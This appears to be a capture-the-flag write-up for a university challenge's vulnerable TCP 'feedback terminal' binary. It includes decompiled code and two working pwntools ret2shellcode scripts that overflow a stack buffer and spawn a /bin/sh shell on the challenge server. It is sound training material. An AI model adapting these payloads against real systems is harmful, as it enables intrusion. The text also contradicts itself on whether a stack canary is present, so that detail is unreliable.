---
title: "UVT CTF – Shellcode sandbox"
date: 2026-06-03 08:01:00 +0200
categories: [Platform, UVT CTF]
tags: [pwn, binary-exploitation, buffer-overflow, shellcode, stack-executable, no-pie, ghidra, pwntools, ret2shellcode, checksec, reverse-engineering]
media_subpath: /assets/img/posts/
---

## **Challenge Information**
**Title:**  Shellcode sandbox  
**Category**:  binary exploitation (pwn)  
**Platform:**  UVT CTF (university CTF platform)  
**Difficulty:**    hard  
**Tags:**  pwn, binary-exploitation, buffer-overflow, shellcode, stack-executable, no-PIE, Ghidra, pwntools, ret2shellcode, checksec, reverse-engineering  
**Date solved:**    03/06/2026 (DD/MM/YYYY)  
**Challenge Description**:  Our feedback terminal is running on the server and accepts user messages over TCP. Something about the way it handles feedback looks unsafe. You are given the same binary that is running remotely. Analyze it, connect to the service and recover the flag.  
**Files provided**:  an executable and connection to the server  

## **Environment and Tools** 
**Operating System**:  Kali Linux (VirtualBox)  
**Tools/ Software**:  VirtualBox, terminal, Mousepad, Mozilla, claude.ai  
**Programming Languages (if any)**:  python, bash  

## **Recognition Pattern**
- "Accepts user messages" + "looks unsafe" + a binary to analyze → buffer overflow, so I dig into the binary for the bug
- `checksec` showing an executable stack (RWX segments) + no PIE → ret2shellcode: put shellcode on the stack and jump to it
- `read(0, buffer, 0x200)` into a 128-byte buffer → 512 bytes into 128, a clear overflow
- The server printing the buffer address ("Your scratch buffer is at %p") → the return target is handed to me, no guessing or brute-forcing

## **Approach and Methodology**
### **Initial Analysis**
After the first read I knew it had to do with connecting to the server and writing a script — most likely something with bytes and maybe a buffer overflow.  

### **Steps Taken**
- Checked the downloaded file with `file` to confirm it's an executable
- Checked with `binwalk` for anything hidden → nothing
- Checked with `strings` for anything hidden in readable text → nothing
- Checked with `checksec` and found this:  

![checksec output showing executable stack and No PIE](Shellcode_Sandbox_1.png)

This means we have a canary, **NX unknown / GNU_STACK missing / Stack: Executable / has RWX segments** — the stack is executable, so you can run code placed on the stack — and **No PIE (0x400000)** — fixed addresses.  

The next step was to open the file in Ghidra. There are four functions of importance: `serve`, `vuln`, `main`, `write_flag_file`.

```c
void vuln(void)
{
    undefined1 local_88 [128];
    printf("Your scratch buffer is at %p\n", local_88);
    puts("Send me your payload:");
    read(0, local_88, 0x200);
    return;
}

void serve(void)
{
    setvbuf((FILE *)stdout, (char *)0x0, 2, 0);
    setvbuf((FILE *)stdin, (char *)0x0, 2, 0);
    puts("=== UVT ICS shellcode sandbox ===");
    vuln();
    puts("Goodbye.");
    return;
}
```

`main` sets up a socket server, forks per connection, wires stdin/stdout/stderr to the socket, then calls `serve()`. And `write_flag_file` writes the flag to `/flag.txt`:

```c
void write_flag_file(void)
{
    FILE *param0;
    char *local_10;
    local_10 = getenv("FLAG");
    if (local_10 == (char *)0x0) {
        local_10 = "UVTICS{local_test_flag}";
    }
    param0 = fopen64("/flag.txt", "w");
    if (param0 != (FILE *)0x0) {
        fprintf(param0, "%s\n", local_10);
        fclose(param0);
    }
    return;
}
```

The memory corruption bug is in how `vuln` handles the buffer (`read` of `0x200` into a 128-byte buffer). In short, I needed to craft an input that makes `vuln` return into an address that opens a shell.  

To do this I needed the offset value, then to write the exploit.  

![finding the offset](Shellcode_Sandbox_2.png)

### **Alternative Approaches (if applicable)**
I ran a bunch of commands across two terminals to find the offset value when it was printed.  

![offset work in terminal 1 — part 1](Shellcode_Sandbox_3.png)

![offset work in terminal 1 — part 2](Shellcode_Sandbox_4.png)

![offset work in terminal 1 — part 3](Shellcode_Sandbox_5.png)

![offset work in terminal 2](Shellcode_Sandbox_6.png)


## **Solution and Flag Retrieval**
*Final Exploit / Command Used:*
```
python3 solution.py
```

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# nc 194.102.62.183 30540
HOST, PORT = '194.102.62.183', 30540
io = remote(HOST, PORT)

io.recvuntil(b'scratch buffer is at ')
buf = int(io.recvline().strip(), 16)
log.info('buffer is at %s', hex(buf))

io.recvuntil(b'payload:')
shellcode = asm(shellcraft.amd64.linux.sh())

OFFSET = 0x88
payload  = shellcode
payload += b'A' * (OFFSET - len(shellcode))
payload += p64(buf)

io.send(payload)
io.interactive()
```

Once the shell drops, `cat /flag.txt` retrieves the flag.  

Another code version:

```python
from pwn import *
import re

#   nc 194.102.62.183 24127
conn=remote('194.102.62.183',24127)

# Your scratch buffer is at
print(conn.recvuntil(b'Your scratch buffer is at '))
buffer=int(conn.recvline().strip(), 16)
print(str(hex(buffer)))

#creates a shell - fist line and keep it in mindS
payload = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
payload += b"A"* (136 - len(payload))
payload +=p64(buffer)

print(conn.recvuntil(b'Send me your payload:'))
conn.send(payload)

conn.interactive()
# cat /flag.txt

#conn.close()
```

## **Lessons Learned**
- `checksec` was my first move and it basically picked the attack for me: executable stack → shellcode, no PIE → fixed addresses, no canary → a straight overflow.
- The ret2shellcode shape: `shellcode + padding up to the return address + overwrite the return address with the buffer's address`, i.e. `payload = shellcode + b'A' * (OFFSET - len(shellcode)) + p64(buffer_address)`.
- The offset `0x88` (136) is the 128-byte buffer plus 8 for the saved RBP: `[buffer 128][saved RBP 8][return address 8]`.
- pwntools made the shellcode trivial — `shellcraft.amd64.linux.sh()` builds a `/bin/sh` and `asm()` assembles it, so no hand-writing shellcode.
- The binary's `write_flag_file()` drops the flag at `/flag.txt`, so once I had a shell `cat /flag.txt` got it — worth checking what the binary does with the flag before you exploit.

## **References**
- Claude.ai
